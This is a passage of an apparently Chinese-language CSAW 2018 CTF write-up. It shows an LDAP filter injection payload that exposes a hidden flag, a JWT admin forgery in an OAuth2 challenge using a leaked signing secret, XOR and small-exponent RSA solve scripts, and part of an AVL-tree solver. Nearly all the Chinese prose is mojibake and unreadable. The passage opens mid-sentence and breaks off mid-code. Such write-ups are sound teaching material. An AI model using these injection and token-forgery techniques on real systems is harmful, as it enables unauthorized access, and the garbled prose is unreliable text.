å¸¦å…¥ï¼Œå˜ä¸º</p><blockquote><p>(&amp;(name=*)(uid=*)(name!=flag))</p></blockquote><p>flag ä¾ç„¶æ— æ³•æŸ¥è¯¢åˆ°ã€‚</p><p>æ‰€ä»¥æ€è·¯æ˜¯é—­åˆæ‰å‰é¢çš„ &amp;ï¼Œå†æ„é€ ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ï¼Œpayloadï¼š</p><blockquote><p>*)(uid=*))(|(uid=*</p></blockquote><p>ä»£å…¥æŸ¥è¯¢è¯­å¥å˜ä¸ºï¼š</p><blockquote><p>(&amp;(name=*)(uid=*))(|(uid=*)(name!=flag))</p></blockquote><p>è¿™æ ·è¿‡æ»¤flagå‰é¢é™åˆ¶å˜æˆäº† â€œ | â€œï¼ŒæŸ¥è¯¢åˆ°flagï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f60930ebc4a38854.png" alt></p><blockquote><p>flag{ld4p_inj3ction_i5_a_th1ng}</p></blockquote><h4 id="sso"><a href="#sso" class="headerlink" title="sso"></a>sso</h4><p>é¢˜ç›®æè¿°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Don&#39;t you love undocumented APIs</span><br><span class="line">Be the admin you were always meant to be</span><br><span class="line">http:&#x2F;&#x2F;web.chal.csaw.io:9000</span><br><span class="line">Update chal description at: 4:38 to include solve details</span><br><span class="line">Aesthetic update for chal at Sun 7:25 AM</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/protected&quot;</span>&gt;</span>.<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Wish we had an automatic GET route for /authorize... well they&#x27;ll just have to POST from their own clients I guess</span></span><br><span class="line"><span class="comment">POST /oauth2/token</span></span><br><span class="line"><span class="comment">POST /oauth2/authorize form-data <span class="doctag">TODO:</span> make a form for this route</span></span><br><span class="line"><span class="comment">--!&gt;</span></span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯åŸºäº OAuth2.0 åè®®çš„èº«ä»½éªŒè¯ï¼Œå»è¡¥ä¸€æ³¢çŸ¥è¯†â€¦</p><p>å…³äºOAuth2.0çš„çŸ¥è¯†ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹å‡ ç¯‡åšå®¢ï¼š</p><ol><li><p><a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html"> é˜®ä¸€å³°çš„åšå®¢ </a></p></li><li><p><a href="https://blog.csdn.net/cd_xuyue/article/details/52084220"> OAuth 2.0æ”»å‡»æ–¹æ³• </a></p></li></ol><p>è¿™é“é¢˜æ¶‰åŠçš„éªŒè¯æ¨¡å¼æ˜¯æˆæƒç æ¨¡å¼ã€‚æµç¨‹å¦‚ä¸‹ï¼š</p><blockquote><ol><li>ç”¨æˆ·è®¿é—®å®¢æˆ·ç«¯ï¼Œåè€…å°†å‰è€…å¯¼å‘è®¤è¯æœåŠ¡å™¨ã€‚</li><li>ç”¨æˆ·é€‰æ‹©æ˜¯å¦ç»™äºˆå®¢æˆ·ç«¯æˆæƒã€‚</li><li>å‡è®¾ç”¨æˆ·ç»™äºˆæˆæƒï¼Œè®¤è¯æœåŠ¡å™¨å°†ç”¨æˆ·å¯¼å‘å®¢æˆ·ç«¯äº‹å…ˆæŒ‡å®šçš„â€é‡å®šå‘ URI â€œï¼ˆredirection URIï¼‰ï¼ŒåŒæ—¶é™„ä¸Šä¸€ä¸ªæˆæƒç ã€‚</li><li>å®¢æˆ·ç«¯æ”¶åˆ°æˆæƒç ï¼Œé™„ä¸Šæ—©å…ˆçš„â€é‡å®šå‘URIâ€ï¼Œå‘è®¤è¯æœåŠ¡å™¨ç”³è¯·ä»¤ç‰Œã€‚è¿™ä¸€æ­¥æ˜¯åœ¨å®¢æˆ·ç«¯çš„åå°çš„æœåŠ¡å™¨ä¸Šå®Œæˆçš„ï¼Œå¯¹ç”¨æˆ·ä¸å¯è§ã€‚</li></ol></blockquote><p>åˆ†ææ­¤é¢˜ï¼Œæˆ‘ä»¬è¦æ‹¿åˆ° token å»è®¿é—® <a href="http://web.chal.csaw.io:9000/protected">http://web.chal.csaw.io:9000/protected</a> å¾—åˆ°flagï¼Œè¿‡ç¨‹åŸºæœ¬å¦‚ä¸‹ï¼š</p><blockquote><p>å…ˆå»è®¿é—® /oauth2/authorizeï¼Œæ„é€  Post è¯·æ±‚æ‹¿åˆ° codeï¼Œå¸¦ç€è¿™ä¸ªcodeå»è®¿é—® /oauth2/tokenï¼Œå¾—åˆ°tokenå»è®¿é—® /oauth2/protected å»æ‰¾flagã€‚</p></blockquote><p>é¦–å…ˆè®¿é—® /oauth2/authorizeï¼Œæ³¨æ„è¦åœ¨ Post è¯·æ±‚ä¸­åŠ  â€œresponse_type=codeâ€ã€‚redirect_uri æ˜¯é‡å®šå‘çš„urlï¼Œä¸åé¢å¡«çš„ä¸€è‡´å°±å¯ä»¥ã€‚<br><img src="https://upload-images.jianshu.io/upload_images/9223743-6287369d8474853e.png" alt="image.png"></p><p>æ‹¿ç€è¿™ä¸ª code å»è®¿é—® /oauth2/tokenï¼Œæ³¨æ„ Post å‚æ•°çš„æ ¼å¼ï¼š<br><img src="https://upload-images.jianshu.io/upload_images/9223743-08fa881ad66e7d90.png" alt="image.png"><br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant_type&#x3D;authorization_code&amp;code&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzODk3OTY4OCwiZXhwIjoxNTM4OTgwMjg4fQ.EmiNRIdeLAij3UUnBP2763GTsBtu-BFMi14yAoQRWFk&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;web.chal.csaw.io:9000&#x2F;protected</span><br></pre></td></tr></table></figure><p>å¾—åˆ° tokenï¼Œè¿›è¡Œ <a href="https://jwt.io/">jwt åœ¨çº¿è§£ç </a>:<br><img src="https://upload-images.jianshu.io/upload_images/9223743-991d446b936a73b2.png" alt="image.png"><br>è¿™é‡Œçš„ ufoundme! å°±æ˜¯åŠ å¯†çš„å¯†é’¥ï¼Œæ ¹æ®é¢˜ç›®æç¤ºæŠŠ user æ”¹ä¸º admin ,ä¸‹é¢å¯†é’¥æ¢æˆ ufoundme!<br><img src="https://upload-images.jianshu.io/upload_images/9223743-155a7de326b70296.png" alt="image.png"><br>æ‹¿ç€è¿™ä¸ªæ–°çš„ token å»è®¿é—® <a href="http://web.chal.csaw.io:9000/protected">http://web.chal.csaw.io:9000/protected</a> å¾—åˆ°flag:<br><img src="https://upload-images.jianshu.io/upload_images/9223743-6c8250f661ce4a35.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag: flag&#123;JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><ol><li><p><a href="https://www.secpulse.com/archives/75785.html">https://www.secpulse.com/archives/75785.html</a></p></li><li><p><a href="https://delcoding.github.io/2018/09/csaw-writeup2/">https://delcoding.github.io/2018/09/csaw-writeup2/</a></p></li></ol><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h4><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet<br>single yeet yeeted with single yeet == 0<br>yeeet<br>what is yeet?<br>yeet is yeet<br>Yeetdate: yeeted yeet at yeet: 9:42 pm</p></blockquote><p>å¯†æ–‡ç»™äº†ä¸€ä¸²base64:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s5qQkd+WjN+e34+NkJiNnpKSmo3fiJeQ356Mj5aNmozfi5DfnI2anoua34+NkJiNnpKM34uXnovfl5qTj9+PmpCPk5rfm5Dfk5qMjNHft5rfiJ6Ri4zfi5Dfj4qL356Ki5CSnouWkJHfmZaNjIvT356Rm9+MnJ6Tnp2Wk5aLht+ek5CRmIyWm5rR37ea35uNmp6SjN+Qmd+e34iQjZOb34iXmo2a34uXmt+akZuTmoyM356Rm9+Ll5rflpGZlpGWi5rfnZqckJKa342anpOWi5aajN+LkN+SnpGUlpGb09+ekZvfiJeajZrfi5ea34uNiprfiZ6TiprfkJnfk5aZmt+WjN+PjZqMmo2JmpvRmZOemISblpmZlprSl5qTk5KekdKYz4+XzI2FjZ6wps61npPLnLeeuabGrKithr6uyZ63gg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>å¯†æ–‡è§£ç æ˜¯ä¹±ç </p><p>è¯´äº†è¿™ä¹ˆå¤šï¼Œyeet åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œé€šè¿‡ç¬¬äºŒå¥çŒœæµ‹å¯èƒ½æ˜¯å¼‚æˆ–(è‡ªå·±å’Œè‡ªå·± yeet ä¸º0)</p><p>é€å­—èŠ‚å¼‚æˆ– åªæœ‰ 256 ç§æƒ…å†µï¼Œå†™å‡ºçˆ†ç ´è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">ciphertext=<span class="string">&quot;s5qQkd+WjN+e34+NkJiNnpKSmo3fiJeQ356Mj5aNmozfi5DfnI2anoua34+NkJiNnpKM34uXnovfl5qTj9+PmpCPk5rfm5Dfk5qMjNHft5rfiJ6Ri4zfi5Dfj4qL356Ki5CSnouWkJHfmZaNjIvT356Rm9+MnJ6Tnp2Wk5aLht+ek5CRmIyWm5rR37ea35uNmp6SjN+Qmd+e34iQjZOb34iXmo2a34uXmt+akZuTmoyM356Rm9+Ll5rflpGZlpGWi5rfnZqckJKa342anpOWi5aajN+LkN+SnpGUlpGb09+ekZvfiJeajZrfi5ea34uNiprfiZ6TiprfkJnfk5aZmt+WjN+PjZqMmo2JmpvRmZOemISblpmZlprSl5qTk5KekdKYz4+XzI2FjZ6wps61npPLnLeeuabGrKithr6uyZ63gg==&quot;</span></span><br><span class="line">cipher=base64.b64decode(ciphertext)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> cipher:</span><br><span class="line">        result+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s)^i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span> result</span><br></pre></td></tr></table></figure><blockquote><p>flag: flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}</p></blockquote><h4 id="lowe"><a href="#lowe" class="headerlink" title="lowe"></a>lowe</h4><blockquote><p>I personally prefer Home Depot<br>XOR Passes are the easiest way to use numbers to encrypt!<br>By Kris Kwiatkowski, Cloudflare</p></blockquote><p>é™„ä»¶æœ‰ä¸‰ä¸ªï¼š</p><ul><li>file.enc</li><li>key.enc</li><li>pubkey.pem</li></ul><p><strong>file.enc</strong> æ˜¯ä¸€ä¸² base64 ç¼–ç ï¼Œè§£ç æ˜¯ä¸€ä¸²ä¹±ç ï¼Œçœ‹èµ·æ¥åƒæ˜¯åŠ å¯†è¿‡ã€‚</p><blockquote><p>kStoynmN5LSniue0nDxli9csSrBgexZ/YOo5e+MUkfJKwvht8hHsYyMGVYzMlOp9sAFBrPCbm4UA4n7oMr2zlg==</p></blockquote><p><strong>key.enc</strong>æ˜¯ 1533bit çš„ä¸€ä¸ªæ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">219135993109607778001201845084150602227376141082195657844762662508084481089986056048532133767792600470123444605795683268047281347474499409679660783370627652563144258284648474807381611694138314352087429271128942786445607462311052442015618558352506502586843660097471748372196048269942588597722623967402749279662913442303983480435926749879440167236197705613657631022920490906911790425443191781646744542562221829319509319404420795146532861393334310385517838840775182</span><br></pre></td></tr></table></figure><p><strong>pubkey.pem</strong> æ˜¯RSAå…¬é’¥æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIHdMA0GCSqGSIb3DQEBAQUAA4HLADCBxwKBwQDPcH7tl5AXt&#x2F;b0dv87plVZrbGC</span><br><span class="line">4Hz6IzOx7AVrf3uWEkBU8fV0iwTDaU6Q8Nmf7gWEqHpwgXWA1JOTMhuyCAf&#x2F;3iWk</span><br><span class="line">yKvUbZXB43QNnmQf53+bls7K6RjmeiSJUrXaga53Qr2uUbEpJFlzQVBXrnXft1p4</span><br><span class="line">6CQ3nlJQZZLDdQ6aHH5wG+6N38epynJTTNOwlXn4ek6zdvkmfNGhbh5XkJXFuG9L</span><br><span class="line">jyT7YT8Ip+DkddJVVq5ByM7iSOkNrJZdxH3btMUCAQM&#x3D;</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ<a href="https://lapo.it/asn1js/">åœ¨çº¿æå–</a>å‡º RSA å…¬é’¥çš„nå’Œe (é€‰æ‹© openssl æå–ä¹Ÿå¯ä»¥)ã€‚å‘ç° n æ˜¯1536bitï¼Œè€Œ e ä»…ä»…ä¸º 3ã€‚<br><img src="https://upload-images.jianshu.io/upload_images/9223743-c677b694fd77ce05.png" alt="image.png"><br>åˆ†æä»¥ä¸Šæ¡ä»¶ï¼Œä¸éš¾å¾—å‡º key.enc æ˜¯ RSA åŠ å¯†çš„ cï¼Œä½æ•°ç›¸è¿‘ã€‚ æ­¤é¢˜ e è¿™ä¹ˆå°ï¼ŒçŒœæƒ³å¯èƒ½ç›´æ¥å¼€ä¸‰æ¬¡æ–¹å¼€å‡ºæ¥ï¼Œæˆ–è€… <em>*c + i\</em> n **èƒ½å¤Ÿç›´æ¥å¼€ä¸‰æ¬¡æ–¹ï¼Œå…¶ä¸­ i ç©·ä¸¾ã€‚</p><p>è¯•äº†ä¸€ä¸‹å‘ç°æˆåŠŸï¼Œå¾—åˆ° RSA æ˜æ–‡ mï¼Œæ ¹æ®é¢˜ç›®æç¤ºå’Œ file.enc è¿›è¡Œå¼‚æˆ–ï¼Œå¾—åˆ° flagï¼Œè§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import base64</span><br><span class="line">import libnum</span><br><span class="line">n&#x3D;1953100985460341348696462250270875098931515807146586756296095446519328460202594322688077959911801412881736536007030245814199784734114468379391959242638228445246656155129859794350223734103552981321896683545886584718379382489138858499065228901412805708175575610007278296746952620830529848517741610397035368508736304074009571123132231492002047409382240786830369954266084929667038697671614351425836882238175963587766360974168461069129309445949172255481878016805287109</span><br><span class="line">e&#x3D;3</span><br><span class="line">key&#x3D;219135993109607778001201845084150602227376141082195657844762662508084481089986056048532133767792600470123444605795683268047281347474499409679660783370627652563144258284648474807381611694138314352087429271128942786445607462311052442015618558352506502586843660097471748372196048269942588597722623967402749279662913442303983480435926749879440167236197705613657631022920490906911790425443191781646744542562221829319509319404420795146532861393334310385517838840775182</span><br><span class="line">data&#x3D;base64.b64decode(open(&quot;file.enc&quot;,&quot;rb&quot;).read())</span><br><span class="line">data&#x3D;int(data.encode(&quot;hex&quot;),16)</span><br><span class="line">for i in range(10000):</span><br><span class="line">    if gmpy2.iroot(key+i*n,e)[1]:</span><br><span class="line">        m&#x3D;gmpy2.iroot(key+i*n,e)[0]</span><br><span class="line">plain&#x3D;libnum.n2s(m^data)</span><br><span class="line">print plain</span><br></pre></td></tr></table></figure><blockquote><p>flag: flag{saltstacksaltcomit5dd304276ba5745ec21fc1e6686a0b28da29e6fc}</p></blockquote><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="bin-t"><a href="#bin-t" class="headerlink" title="bin_t"></a>bin_t</h4><p>é¢˜ç›®æè¿°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Binary trees let you do some interesting things. Can you balance a tree?</span><br><span class="line">nc misc.chal.csaw.io 9001</span><br><span class="line">Equal nodes should be inserted to the right of the parent node. You should balance the tree as you add nodes.</span><br></pre></td></tr></table></figure><p>ACMå…¥é—¨çº§ï¼ŒAVLæ ‘çš„ç”Ÿæˆå’Œæ ‘çš„å‰åºéå†ï¼Œè´´ä¸Špythonä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.data=<span class="number">0</span></span><br><span class="line">        self.left=<span class="literal">None</span></span><br><span class="line">        self.right=<span class="literal">None</span></span><br><span class="line">        self.height=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BTree</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.root=<span class="literal">None</span></span><br><span class="line">        self.result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__Max</span>(<span class="params">self,h1,h2</span>):</span></span><br><span class="line">        <span class="keyword">if</span> h1&gt;h2:</span><br><span class="line">            <span class="keyword">return</span> h1</span><br><span class="line">        <span class="keyword">elif</span> h1&lt;=h2:</span><br><span class="line">            <span class="keyword">return</span> h2</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__LL</span>(<span class="params">self,r</span>):</span><span class="comment">#å·¦å·¦æƒ…å†µï¼Œå‘å³æ—‹è½¬</span></span><br><span class="line">        node=r.left</span><br><span class="line">        r.left=node.right</span><br><span class="line">        node.right=r</span><br><span class="line">        r.height=self.__Max(self.getHeight(r.right),self.getHeight(r.left))+<span class="number">1</span></span><br><span class="line">        node.height=self.__Max(self.getHeight(node.right),self.getHeight(node.left))+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> node</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__RR</span>(<span class="params">self,r</span>):</span><span class="comment">#å³å³ï¼Œå·¦æ—‹</span></span><br><span class="line">        node = r.right</span><br><span class="line">        r.right = node.left</span><br><span class="line">        node.left = r</span><br><span class="line">        r.height = self.__Max(self.getHeight(r.right), self.getHeight(r.left)) + <span class="number">1</span></span><br><span class="line">        node.height = self.__Max(self.getHeight(node.right), self.getHeight(node.left)) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> node</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__LR</span>(<span class="params">self,r</span>):</span><span class="comment">#å·¦å³ï¼Œå…ˆå·¦æ—‹å†å³æ—‹</span></span><br><span class="line">        r.left=self.__RR(r.left)</span><br><span class="line">        <span class="keyword">return</span> self.__LL(r)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__RL</span>(<span class="params">self,r</span>):</span><span class="comment">#å³å·¦ï¼Œå…ˆå³æ—‹å†å·¦æ—‹</span></span><br><span class="line">        r.right=self.__LL(r.right)</span><br><span class="line">        <span class="keyword">return</span> self.__RR(r)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__insert</span>(<span class="params">self,data,r</span>):</span></span><br><span class="line">        <span class="keyword">if</span> r==<span class="literal">None</span>:</span><br><span class="line">            node=TreeNode()</span><br><span class="line">            node.data=data</span><br><span class="line">            <span class="keyword">return</span> node</span><br><span class="line">        <span class="keyword">elif</span> data==r.data:</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        <span class="keyword">elif</span> data&lt;r.data:</span><br><span class="line">            r.left=self.__insert(data,r.left)</span><br><span class="line">            <span class="keyword">if</span> self.getHeight(r.left)-self.getHeight(r.right)&gt;=<span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> data&lt;r.left.data:</span><br><span class="line">                    r=self.__LL(r)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r=self.__LR(r)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r.right=self.__insert(data,r.right)</span><br><span class="line">            <span class="keyword">if</span> self.getHeight(r.right)-self.getHeight(r.left)&gt;=<span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> data&gt;r.right.data:</span><br><span class="line">                    r=self.__RR(r)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r=self.__RL(r)</span><br><span class="line">        r.height=self.__Max(self.getHeight(r.left),self.getHeight(r.right))+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="comment"># åˆ é™¤dataèŠ‚ç‚¹</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delete</span>(<span class="params">self,data,r</span>):</span></span><br><span class="line">        <span class="keyword">if</span> r==<span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;don&#x27;t have %d&quot;</span>%data</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        <span class="keyword">elif</span> r.data==data:</span><br><span class="line">            <span class="keyword">if</span> r.left==<span class="literal">None</span>:<span class="comment">#å¦‚æœåªæœ‰å³å­æ ‘ï¼Œç›´æ¥å°†å³å­æ ‘èµ‹å€¼åˆ°æ­¤èŠ‚ç‚¹</span></span><br><span class="line">                <span class="keyword">return</span> r.right</span><br><span class="line">            <span class="keyword">elif</span> r.right==<span class="literal">None</span>:<span class="comment">#å¦‚æœåªæœ‰å·¦å­æ ‘ï¼Œç›´æ¥å°†å·¦å­æ ‘èµ‹å€¼åˆ°æ­¤èŠ‚ç‚¹</span></span><br><span class="line">                <span class="keyword">return</span> r.left</span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#å¦‚æœåŒæ—¶æœ‰å·¦å³å­æ ‘</span></span><br><span class="line">                <span class="keyword">if</span> self.getHeight(r.left)&gt;self.getHeight(r.right):<span class="comment">#å·¦å­æ ‘é«˜åº¦å¤§äºå³å­æ ‘</span></span><br><span class="line">                    <span class="comment">#æ‰¾åˆ°æœ€å³èŠ‚ç‚¹ è¿”å›èŠ‚ç‚¹å€¼ å¹¶åˆ é™¤è¯¥èŠ‚ç‚¹</span></span><br><span class="line">                    node=r.left</span><br><span class="line">                    <span class="keyword">while</span>(node.right!=<span class="literal">None</span>):</span><br><span class="line">                        node=node.right</span><br><span class="line">                    r=self.__delete(node.data,r)</span><br><span class="line">                    r.data=node.data</span><br><span class="line">                    <span class="keyword">return</span> r</span><br><span class="line">                <span class="keyword">else</span>:<span class="comment">#å³å­æ ‘é«˜åº¦å¤§äºå·¦å­æ ‘</span></span><br><span class="line">                    node=r.right</span><br><span class="line">                    <span class="keyword">while</span> node.left!=<span class="literal">None</span>:</span><br><span class="line">                        node=node.left</span><br><span class="line">                    r=self.__delete(node.data,r)</span><br><span class="line">                    r.data=node.data</span><br><span class="line">                    <span class="keyword">return</span> r</span><br><span class="line">        <span class="keyword">elif</span> data&lt;r.data:</span><br><span class="line">            r.left=self.__delete(data,r.left)<span class="comment">#åœ¨å·¦å­æ ‘ä¸­åˆ é™¤</span></span><br><span class="line">            <span class="keyword">if</span> self.getHeight(r.right)-self.getHeight(r.left)&gt;=<span class="number">2</span>:<span class="comment">#å³å­æ ‘é«˜åº¦ä¸å·¦å­æ ‘é«˜åº¦ç›¸å·®è¶…è¿‡1</span></span><br><span class="line">                <span class="keyword">if</span> self.getHeight(r.right.left)&gt;self.getHeight(r.right.right):</span><br><span class="line">                    r=self.__RL(r)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r=self.__RR(r)</span><br><span class="line">        <span class="keyword">elif</span> data&gt;r.data:</span><br><span class="line">            r.right=self.__delete(data,r.right)<span class="comment">#å³å­æ ‘ä¸­åˆ é™¤</span></span><br><span class="line">            <span class="keyword">if</span> self.getHeight(r.left)-self.getHeight(r.right)&gt;=<span class="number">2</span>:<span class="comment">#å·¦å­æ ‘ä¸å³å­æ ‘é«˜åº¦ç›¸å·®è¶…è¿‡1</span></span><br><span class="line">                <span class="keyword">if</span> self.getHeight(r.left.right)&gt;self.getHeight(r.left.left):</span><br><span class="line">                    r=self.__LR(r)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r=self.__LL(r)</span><br><span class="line">        r.height=self.__Max(self.getHeight(r.left),self.getHeight(r.right))+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="comment">#å…ˆåºéå†</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 